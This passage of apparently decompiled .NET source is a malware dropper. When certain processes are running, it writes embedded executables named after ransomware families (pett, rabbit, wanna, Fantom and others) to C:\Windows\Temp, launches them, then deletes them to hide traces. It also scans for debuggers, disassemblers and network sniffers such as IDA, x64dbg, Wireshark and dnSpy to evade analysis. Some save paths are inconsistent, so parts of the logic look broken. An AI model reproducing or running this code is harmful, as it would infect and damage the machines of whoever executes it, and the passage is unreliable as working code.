				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array36 = processes;
		foreach (Process process36 in array36)
		{
			if (Operators.CompareString(text34, process36.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array37 = processes;
		foreach (Process process37 in array37)
		{
			if (Operators.CompareString(text35, process37.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array38 = processes;
		foreach (Process process38 in array38)
		{
			if (Operators.CompareString(text36, process38.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array39 = processes;
		foreach (Process process39 in array39)
		{
			if (Operators.CompareString(text37, process39.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array40 = processes;
		foreach (Process process40 in array40)
		{
			if (Operators.CompareString(text38, process40.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array41 = processes;
		foreach (Process process41 in array41)
		{
			if (Operators.CompareString(text39, process41.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array42 = processes;
		foreach (Process process42 in array42)
		{
			if (Operators.CompareString(text40, process42.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array43 = processes;
		foreach (Process process43 in array43)
		{
			if (Operators.CompareString(text41, process43.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("aaaaaaa");
		Process[] processesByName2 = Process.GetProcessesByName("ollydbg");
		Process[] processesByName3 = Process.GetProcessesByName("ida");
		Process[] processesByName4 = Process.GetProcessesByName("ida64");
		Process[] processesByName5 = Process.GetProcessesByName("idag");
		Process[] processesByName6 = Process.GetProcessesByName("idag64");
		Process[] processesByName7 = Process.GetProcessesByName("idaw");
		Process[] processesByName8 = Process.GetProcessesByName("idaw64");
		Process[] processesByName9 = Process.GetProcessesByName("idaq");
		Process[] processesByName10 = Process.GetProcessesByName("idaq64");
		Process[] processesByName11 = Process.GetProcessesByName("idau");
		Process[] processesByName12 = Process.GetProcessesByName("idau64");
		Process[] processesByName13 = Process.GetProcessesByName("scylla");
		Process[] processesByName14 = Process.GetProcessesByName("scylla_x64");
		Process[] processesByName15 = Process.GetProcessesByName("scylla_x86");
		Process[] processesByName16 = Process.GetProcessesByName("protection_id");
		Process[] processesByName17 = Process.GetProcessesByName("x64dbg");
		Process[] processesByName18 = Process.GetProcessesByName("x32dbg");
		Process[] processesByName19 = Process.GetProcessesByName("windbg");
		Process[] processesByName20 = Process.GetProcessesByName("reshacker");
		Process[] processesByName21 = Process.GetProcessesByName("ImportREC");
		Process[] processesByName22 = Process.GetProcessesByName("IMMUNITYDEBUGGER");
		Process[] processesByName23 = Process.GetProcessesByName("MegaDumper");
		Process[] processesByName24 = Process.GetProcessesByName("die");
		Process[] processesByName25 = Process.GetProcessesByName("Reflector");
		Process[] processesByName26 = Process.GetProcessesByName("DotNetResolver");
		Process[] processesByName27 = Process.GetProcessesByName("ProcessHacker");
		Process[] processesByName28 = Process.GetProcessesByName("ExtremeDumper");
		Process[] processesByName29 = Process.GetProcessesByName("RDG Packer Detector 0.7.6");
		Process[] processesByName30 = Process.GetProcessesByName("Winabler");
		Process[] processesByName31 = Process.GetProcessesByName("Charles");
		Process[] processesByName32 = Process.GetProcessesByName("Wireshark");
		Process[] processesByName33 = Process.GetProcessesByName("Fiddler");
		Process[] processesByName34 = Process.GetProcessesByName("VB Decompiler");
		Process[] processesByName35 = Process.GetProcessesByName("ResourceHacker");
		Process[] processesByName36 = Process.GetProcessesByName("gct0lly");
		Process[] processesByName37 = Process.GetProcessesByName("Debuggy1-9f");
		Process[] processesByName38 = Process.GetProcessesByName("Dumper64");
		Process[] processesByName39 = Process.GetProcessesByName("ollyice");
		Process[] processesByName40 = Process.GetProcessesByName("CFF Explorer");
		Process[] processesByName41 = Process.GetProcessesByName("dnSpy");
